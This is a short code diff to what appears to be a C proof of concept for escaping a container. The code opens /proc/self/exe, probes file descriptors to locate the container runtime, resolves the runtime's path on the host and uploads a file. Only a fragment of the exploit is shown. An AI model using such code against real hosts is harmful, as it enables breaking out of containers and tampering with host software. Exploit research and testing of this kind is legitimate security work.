@@ -131,8 +131,9 @@ int main(int argc, char const *argv[])
         runtime_fd = open("/proc/self/exe", O_RDONLY); 
         if (runtime_fd < 0)
         {
-            printf("[!] main: open(\"/proc/self/exe\") failed with '%s'\n", strerror(errno));
-            return 1;
+            if (fcntl(runtime_fd + 1, F_GETFD) == -1 && errno == EBADF)
+                break; // if next fd is invalid, the current is the runtime
+            runtime_fd++;
         }
 
         // Restore original dynamic linker to allow curl to work properly
@@ -185,6 +186,7 @@ int main(int argc, char const *argv[])
         printf("[!] upload_file: fstat(fp) failed with '%s'\n", strerror(errno));
         goto close_runtime_ret_1;
     }
+
     /* Try to get the runtime's path on the host */
     rc = readlink(ctr_link_to_rt_buf, rt_hostpath_buf, SMALL_BUF_SIZE);
     if (rc < 0)
